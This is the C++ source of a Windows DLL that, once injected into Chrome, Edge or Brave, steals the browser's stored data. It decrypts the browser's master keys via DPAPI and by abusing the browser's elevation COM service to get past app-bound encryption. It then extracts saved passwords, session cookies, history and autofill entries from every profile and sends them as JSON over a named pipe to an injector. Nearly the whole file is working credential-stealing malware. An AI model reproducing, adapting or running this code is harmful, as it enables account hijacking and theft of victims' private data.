#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <thread>
#include <algorithm>
#include <wincrypt.h>
#include <shlobj.h>
#include <objbase.h>
#include "sqlite3.h"
#include "json.hpp"
#include <bcrypt.h>

using json = nlohmann::json;
namespace fs = std::filesystem;

void log_to_file(const std::string& msg) {
    char* user_profile = nullptr;
    size_t len = 0;
    _dupenv_s(&user_profile, &len, "USERPROFILE");
    if (user_profile) {
        fs::path log_path = fs::path(user_profile) / "Desktop" / "extractor_log.txt";
        std::ofstream log_file(log_path, std::ios::app);
        if (log_file) {
            log_file << "[" << GetTickCount() << "] " << msg << std::endl;
        }
        free(user_profile);
    }
}

std::string to_utf8_lossy(const std::vector<unsigned char>& input) {
    std::string output;
    output.reserve(input.size());
    for (unsigned char c : input) {
        if (c < 32 && c != '\r' && c != '\n' && c != '\t') {
            output += ' ';
        } else {
            output += (char)c;
        }
    }
    return output;
}

std::string ensure_utf8(const std::string& input) {
    std::string output;
    output.reserve(input.size());
    for (unsigned char c : input) {
        if (c < 32 && c != '\r' && c != '\n' && c != '\t') output += ' ';
        else output += (char)c;
    }
    return output;
}

enum class Browser { Chrome, Edge, Brave };

struct PasswordData { std::string url, username, password; };
struct CookieData {
    std::string host, name, value, path;
    long long expires_utc;
    int is_secure, is_httponly, samesite;
};
struct HistoryData { std::string url, title; int visit_count; };
struct AutofillData { std::string name, value; };
struct ProfileData {
    std::string name;
    std::vector<PasswordData> passwords;
    std::vector<CookieData> cookies;
    std::vector<HistoryData> history;
    std::vector<AutofillData> autofill;
};

// COM Interface definitions
struct IElevatorVTbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(void*, const GUID*, void**);
    ULONG(STDMETHODCALLTYPE* AddRef)(void*);
    ULONG(STDMETHODCALLTYPE* Release)(void*);
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(void*, const wchar_t*, const wchar_t*, const wchar_t*, uint32_t, uint32_t*);
    HRESULT(STDMETHODCALLTYPE* EncryptData)(void*, uint32_t, BSTR, BSTR*, uint32_t*);
    HRESULT(STDMETHODCALLTYPE* DecryptData)(void*, BSTR, BSTR*, uint32_t*);
};

struct IEdgeElevatorVTbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(void*, const GUID*, void**);
    ULONG(STDMETHODCALLTYPE* AddRef)(void*);
    ULONG(STDMETHODCALLTYPE* Release)(void*);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod1)(void*);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod2)(void*);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod3)(void*);
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(void*, const wchar_t*, const wchar_t*, const wchar_t*, uint32_t, uint32_t*);
    HRESULT(STDMETHODCALLTYPE* EncryptData)(void*, uint32_t, BSTR, BSTR*, uint32_t*);
    HRESULT(STDMETHODCALLTYPE* DecryptData)(void*, BSTR, BSTR*, uint32_t*);
};

const GUID CLSID_CHROME_ELEVATOR = { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
const GUID IID_CHROME_IELEVATOR1 = { 0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8} };
const GUID IID_CHROME_IELEVATOR2 = { 0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38} };

const GUID CLSID_EDGE_ELEVATOR = { 0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
const GUID IID_EDGE_IELEVATOR1 = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };
const GUID IID_EDGE_IELEVATOR2 = { 0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05} };

const GUID CLSID_BRAVE_ELEVATOR = { 0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B} };
const GUID IID_BRAVE_IELEVATOR1 = { 0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9} };
const GUID IID_BRAVE_IELEVATOR2 = { 0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38} };

std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data) {
    DATA_BLOB input = { (DWORD)data.size(), (BYTE*)data.data() };
    DATA_BLOB output = { 0, nullptr };
    if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
        std::vector<unsigned char> res(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
        return res;
    }
    return {};
}

std::vector<unsigned char> decrypt_with_elevator(const std::vector<unsigned char>& encrypted_blob, Browser browser) {
    GUID clsid;
    std::vector<GUID> iids;
    if (browser == Browser::Chrome) { clsid = CLSID_CHROME_ELEVATOR; iids = { IID_CHROME_IELEVATOR2, IID_CHROME_IELEVATOR1 }; }
    else if (browser == Browser::Edge) { clsid = CLSID_EDGE_ELEVATOR; iids = { IID_EDGE_IELEVATOR2, IID_EDGE_IELEVATOR1 }; }
    else { clsid = CLSID_BRAVE_ELEVATOR; iids = { IID_BRAVE_IELEVATOR2, IID_BRAVE_IELEVATOR1 }; }

    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return {};

    void* elevator = nullptr;
    for (auto& iid : iids) {
        hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid, &elevator);
        if (SUCCEEDED(hr)) break;
    }

    if (!elevator) { CoUninitialize(); return {}; }

    CoSetProxyBlanket((IUnknown*)elevator, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);

    BSTR bstr_enc = SysAllocStringByteLen((const char*)encrypted_blob.data(), encrypted_blob.size());
    BSTR bstr_dec = nullptr;
    uint32_t last_error = 0;

    if (browser == Browser::Edge) {
        auto vtable = *(IEdgeElevatorVTbl**)elevator;
        hr = vtable->DecryptData(elevator, bstr_enc, &bstr_dec, &last_error);
    } else {
        auto vtable = *(IElevatorVTbl**)elevator;
        hr = vtable->DecryptData(elevator, bstr_enc, &bstr_dec, &last_error);
    }

    std::vector<unsigned char> res;
    if (SUCCEEDED(hr) && bstr_dec) {
        res.assign((unsigned char*)bstr_dec, (unsigned char*)bstr_dec + SysStringByteLen(bstr_dec));
    }

    if (bstr_enc) SysFreeString(bstr_enc);
    if (bstr_dec) SysFreeString(bstr_dec);

    auto vtable = *(IElevatorVTbl**)elevator;
    vtable->Release(elevator);
    CoUninitialize();
    return res;
}

std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key, const std::vector<unsigned char>& data) {
    if (data.size() < 15) return {};

    BCRYPT_ALG_HANDLE h_alg = nullptr;
    BCRYPT_KEY_HANDLE h_key = nullptr;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    memset(&info, 0, sizeof(info));
    info.cbSize = sizeof(info);
    info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;

    if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0) return {};
    if (BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }

    if (BCryptGenerateSymmetricKey(h_alg, &h_key, nullptr, 0, (BYTE*)key.data(), key.size(), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }

    std::vector<unsigned char> nonce(data.begin() + 3, data.begin() + 15);
    std::vector<unsigned char> ciphertext(data.begin() + 15, data.end() - 16);
    std::vector<unsigned char> tag(data.end() - 16, data.end());

    info.pbNonce = nonce.data();
    info.cbNonce = nonce.size();
    info.pbTag = tag.data();
    info.cbTag = tag.size();

    std::vector<unsigned char> plaintext(ciphertext.size());
    DWORD cb_plain = 0;
    if (BCryptDecrypt(h_key, ciphertext.data(), ciphertext.size(), &info, nullptr, 0, plaintext.data(), plaintext.size(), &cb_plain, 0) != 0) {
        BCryptDestroyKey(h_key);
        BCryptCloseAlgorithmProvider(h_alg, 0);
        return {};
    }

    BCryptDestroyKey(h_key);
    BCryptCloseAlgorithmProvider(h_alg, 0);
    plaintext.resize(cb_plain);
    return plaintext;
}

static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0, j = 0, in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::vector<unsigned char> ret;
    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; i < 3; i++) ret.push_back(char_array_3[i]);
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }
    return ret;
}

std::string wstring_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

bool copy_file_locked(const fs::path& source, const fs::path& dest) {
    for (int i = 0; i < 3; i++) {
        HANDLE h_src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, 0, nullptr);
        if (h_src != INVALID_HANDLE_VALUE) {
            HANDLE h_dest = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
            if (h_dest != INVALID_HANDLE_VALUE) {
                char buffer[65536];
                DWORD bytes_read, bytes_written;
                bool has_data = false;
                while (ReadFile(h_src, buffer, sizeof(buffer), &bytes_read, nullptr) && bytes_read > 0) {
                    WriteFile(h_dest, buffer, bytes_read, &bytes_written, nullptr);
                    has_data = true;
                }
                CloseHandle(h_src);
                CloseHandle(h_dest);
                if (has_data) return true;
            } else {
                CloseHandle(h_src);
            }
        }
        Sleep(200);
    }
    return false;
}

int open_db_readonly(const std::string& path, sqlite3** db) {
    std::string norm_path = path;
    std::replace(norm_path.begin(), norm_path.end(), '\\', '/');
    std::string uri = "file:" + norm_path + "?mode=ro&nolock=1";
    return sqlite3_open_v2(uri.c_str(), db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI | SQLITE_OPEN_NOMUTEX, nullptr);
}

Browser get_browser() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    std::wstring s(path);
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    if (s.find(L"msedge.exe") != std::wstring::npos) return Browser::Edge;
    if (s.find(L"brave.exe") != std::wstring::npos) return Browser::Brave;
    return Browser::Chrome;
}

void do_work() {
    try {
        log_to_file("DLL Attached. Starting do_work()...");
        Browser browser = get_browser();
        log_to_file("Browser detected: " + std::to_string((int)browser));

        char* user_profile_env = nullptr;
        size_t len = 0;
        _dupenv_s(&user_profile_env, &len, "USERPROFILE");
        if (!user_profile_env) {
            log_to_file("Error: USERPROFILE env var not found.");
            return;
        }
        fs::path user_profile(user_profile_env);
        free(user_profile_env);

        fs::path data_path;
        if (browser == Browser::Chrome) data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
        else if (browser == Browser::Edge) data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
        else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";

        log_to_file("Data path: " + data_path.string());

        std::string local_state_str;
        std::ifstream ls_file(data_path / "Local State");
        if (ls_file) local_state_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());

        json ls_json = json::parse(local_state_str, nullptr, false);
        std::vector<unsigned char> v10_key, v20_key;

        if (!ls_json.is_discarded() && ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("encrypted_key")) {
            std::string key_b64 = ls_json["os_crypt"]["encrypted_key"];
            auto decoded = base64_decode(key_b64);
            if (decoded.size() > 5 && std::string((char*)decoded.data(), 5) == "DPAPI") {
                log_to_file("Decrypting v10 key via DPAPI...");
                v10_key = decrypt_dpapi(std::vector<unsigned char>(decoded.begin() + 5, decoded.end()));
                log_to_file("v10 key retrieval: " + std::string(v10_key.empty() ? "FAILED" : "SUCCESS"));
            }
        }

        std::string v20_b64;
        if (!ls_json.is_discarded()) {
            if (ls_json.contains("app_bound_encrypted_key")) v20_b64 = ls_json["app_bound_encrypted_key"];
            else if (ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("app_bound_encrypted_key")) v20_b64 = ls_json["os_crypt"]["app_bound_encrypted_key"];
        }
        if (!v20_b64.empty()) {
            log_to_file("Found app_bound_encrypted_key. Decrypting v20 key...");
            auto decoded = base64_decode(v20_b64);
            std::vector<unsigned char> blob = (decoded.size() > 4 && std::string((char*)decoded.data(), 4) == "APPB") ? std::vector<unsigned char>(decoded.begin() + 4, decoded.end()) : decoded;
            v20_key = decrypt_with_elevator(blob, browser);
            log_to_file("v20 key retrieval: " + std::string(v20_key.empty() ? "FAILED" : "SUCCESS"));
        }

        std::vector<std::string> profiles = { "Default" };
        for (const auto& entry : fs::directory_iterator(data_path)) {
            if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) profiles.push_back(entry.path().filename().string());
        }

        json collected = json::array();
        fs::path temp_dir = user_profile / "Desktop/chrome_db";
        fs::create_directories(temp_dir);

        log_to_file("Starting profile iteration. Profiles found: " + std::to_string(profiles.size()));

        for (auto& profile : profiles) {
            log_to_file("Processing profile: " + profile);
            fs::path p_path = data_path / profile;
            ProfileData p_data;
            p_data.name = profile;

            // Passwords
            fs::path db_path = p_path / "Login Data";
            fs::path tmp_db = temp_dir / "pass.tmp";
            if (fs::exists(db_path)) {
                if (copy_file_locked(db_path, tmp_db)) {
                    sqlite3* db;
                    if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                        sqlite3_stmt* stmt;
                        if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
                                const char* t_user = (const char*)sqlite3_column_text(stmt, 1);
                                std::string url = t_url ? t_url : "";
                                std::string user = t_user ? t_user : "";
                                const unsigned char* pass_blob = (const unsigned char*)sqlite3_column_blob(stmt, 2);
                                int pass_len = sqlite3_column_bytes(stmt, 2);
                                std::vector<unsigned char> enc_pass(pass_blob, pass_blob + pass_len);

                                bool is_v20 = (enc_pass.size() > 3 && std::string((char*)enc_pass.data(), 3) == "v20");
                                auto& key = is_v20 ? v20_key : v10_key;
                                if (!key.empty()) {
                                    auto dec = aes_gcm_decrypt(key, enc_pass);
                                    if (!dec.empty()) {
                                        if (dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
                                        p_data.passwords.push_back({ url, user, to_utf8_lossy(dec) });
                                    }
                                }
                            }
                            sqlite3_finalize(stmt);
                        }
                        sqlite3_close(db);
                    }
                }
                fs::remove(tmp_db);
            }

            // Cookies
            db_path = p_path / "Network/Cookies";
            if (!fs::exists(db_path)) db_path = p_path / "Cookies";

            tmp_db = temp_dir / "cook.tmp";
            if (fs::exists(db_path)) {
                if (copy_file_locked(db_path, tmp_db)) {
                    sqlite3* db;
                    if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                        sqlite3_stmt* stmt;
                        if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* t_host = (const char*)sqlite3_column_text(stmt, 0);
                                const char* t_name = (const char*)sqlite3_column_text(stmt, 1);
                                const char* t_path = (const char*)sqlite3_column_text(stmt, 2);
                                std::string host = t_host ? t_host : "";
                                std::string name = t_name ? t_name : "";
                                std::string path = t_path ? t_path : "";
                                long long expires = sqlite3_column_int64(stmt, 3);
                                int secure = sqlite3_column_int(stmt, 4);
                                int httponly = sqlite3_column_int(stmt, 5);
                                int samesite = sqlite3_column_int(stmt, 6);

                                const unsigned char* enc_blob = (const unsigned char*)sqlite3_column_blob(stmt, 7);
                                int enc_len = sqlite3_column_bytes(stmt, 7);
                                std::vector<unsigned char> enc_val(enc_blob, enc_blob + enc_len);

                                bool is_v20 = (enc_val.size() > 3 && std::string((char*)enc_val.data(), 3) == "v20");
                                auto& key = is_v20 ? v20_key : v10_key;
                                if (!key.empty()) {
                                    auto dec = aes_gcm_decrypt(key, enc_val);
                                    if (!dec.empty()) {
                                        if (dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
                                        p_data.cookies.push_back({ host, name, to_utf8_lossy(dec), path, expires, secure, httponly, samesite });
                                    }
                                }
                            }
                            sqlite3_finalize(stmt);
                        }
                        sqlite3_close(db);
                    }
                }
                fs::remove(tmp_db);
            }

            // History
            db_path = p_path / "History";
            tmp_db = temp_dir / "hist.tmp";
            if (fs::exists(db_path)) {
                if (copy_file_locked(db_path, tmp_db)) {
                    sqlite3* db;
                    if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                        sqlite3_stmt* stmt;
                        if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) {
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
                                const char* t_title = (const char*)sqlite3_column_text(stmt, 1);
                                p_data.history.push_back({ t_url ? t_url : "", t_title ? t_title : "", sqlite3_column_int(stmt, 2) });
                            }
                            sqlite3_finalize(stmt);
                        }
                        sqlite3_close(db);
                    }
                }
                fs::remove(tmp_db);
            }

            // Autofill
            db_path = p_path / "Web Data";
            tmp_db = temp_dir / "web.tmp";
            if (fs::exists(db_path)) {
                if (copy_file_locked(db_path, tmp_db)) {
                    sqlite3* db;
                    if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                        sqlite3_stmt* stmt;
                        if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, nullptr) == SQLITE_OK) {
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* t_name = (const char*)sqlite3_column_text(stmt, 0);
                                const char* t_val = (const char*)sqlite3_column_text(stmt, 1);
                                p_data.autofill.push_back({ t_name ? t_name : "", t_val ? t_val : "" });
                            }
                            sqlite3_finalize(stmt);
                        }
                        sqlite3_close(db);
                    }
                }
                fs::remove(tmp_db);
            }

            json pj;
            try {
                pj["name"] = ensure_utf8(p_data.name);
                pj["passwords"] = json::array();
                for (auto& p : p_data.passwords) pj["passwords"].push_back({{"url", ensure_utf8(p.url)}, {"username", ensure_utf8(p.username)}, {"password", ensure_utf8(p.password)}});
                pj["cookies"] = json::array();
                for (auto& c : p_data.cookies) pj["cookies"].push_back({
                    {"host", ensure_utf8(c.host)},
                    {"name", ensure_utf8(c.name)},
                    {"value", ensure_utf8(c.value)},
                    {"path", ensure_utf8(c.path)},
                    {"expires_utc", c.expires_utc},
                    {"is_secure", c.is_secure},
                    {"is_httponly", c.is_httponly},
                    {"samesite", c.samesite}
                });
                pj["history"] = json::array();
                for (auto& h : p_data.history) pj["history"].push_back({{"url", ensure_utf8(h.url)}, {"title", ensure_utf8(h.title)}, {"visit_count", h.visit_count}});
                pj["autofill"] = json::array();
                for (auto& a : p_data.autofill) pj["autofill"].push_back({{"name", ensure_utf8(a.name)}, {"value", ensure_utf8(a.value)}});
                log_to_file("Profile " + profile + " summary: " + std::to_string(p_data.passwords.size()) + " passwords, " + std::to_string(p_data.cookies.size()) + " cookies.");
                collected.push_back(pj);
            } catch (const std::exception& e) {
                log_to_file("Error serializing profile " + profile + ": " + std::string(e.what()));
            }
        }

        log_to_file("Attempting JSON dump...");
        std::string s = collected.dump(-1, ' ', false, nlohmann::json::error_handler_t::replace);
        log_to_file("Generated JSON dump of " + std::to_string(s.size()) + " bytes.");

        HANDLE h_pipe = INVALID_HANDLE_VALUE;
        for (int i = 0; i < 120; i++) {
            h_pipe = CreateFileW(L"\\\\.\\pipe\\chrome_extractor", GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
            if (h_pipe != INVALID_HANDLE_VALUE) break;

            DWORD err = GetLastError();
            if (err == ERROR_PIPE_BUSY) {
                WaitNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", 1000);
            } else {
                if (i % 10 == 0) log_to_file("Pipe connection attempt " + std::to_string(i) + " failed. Error: " + std::to_string(err));
                Sleep(500);
            }
        }

        if (h_pipe != INVALID_HANDLE_VALUE) {
            log_to_file("Connected to named pipe. Attempting to send " + std::to_string(s.size()) + " bytes...");
            DWORD written;
            if (WriteFile(h_pipe, s.c_str(), (DWORD)s.size(), &written, nullptr)) {
                if (FlushFileBuffers(h_pipe)) {
                    log_to_file("Data sent and flushed successfully: " + std::to_string(written) + " bytes.");
                    Sleep(1000); // Wait for injector to read
                } else {
                    log_to_file("Data sent (" + std::to_string(written) + " bytes) but FlushFileBuffers failed: " + std::to_string(GetLastError()));
                }
            } else {
                log_to_file("Error sending data via pipe: " + std::to_string(GetLastError()));
            }
            CloseHandle(h_pipe);
        } else {
            log_to_file("Error: Could not connect to named pipe after 60 attempts. Error: " + std::to_string(GetLastError()));
        }
    } catch (const std::exception& e) {
        log_to_file("Exception in do_work: " + std::string(e.what()));
    } catch (...) {
        log_to_file("Unknown exception in do_work.");
    }
}

DWORD WINAPI thread_func(LPVOID) {
    do_work();
    return 0;
}

extern "C" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Filter out sub-processes
        std::wstring cmd = GetCommandLineW();
        if (cmd.find(L"--type=") == std::wstring::npos) {
            HANDLE hThread = CreateThread(NULL, 0, thread_func, NULL, 0, NULL);
            if (hThread) CloseHandle(hThread);
        }
    }
    return TRUE;
}
